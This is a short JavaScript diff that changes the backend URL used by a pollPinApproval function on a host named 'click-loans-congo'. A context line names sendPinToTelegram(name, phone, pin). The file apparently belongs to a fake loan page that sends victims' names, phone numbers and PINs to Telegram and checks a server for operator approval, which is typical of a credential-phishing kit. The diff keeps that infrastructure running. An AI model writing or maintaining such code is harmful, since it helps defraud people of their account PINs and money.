@@ -200,7 +200,7 @@ async function sendPinToTelegram(name, phone, pin) {
 }
 
 async function pollPinApproval(requestId) {
-  const BACKEND_URL = "https://click-loans-congo.onrender.com";
+  const BACKEND_URL = "https://click-loans-congo-x50d.onrender.com";
   return new Promise(resolve => {
     const i = setInterval(async () => {
       const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
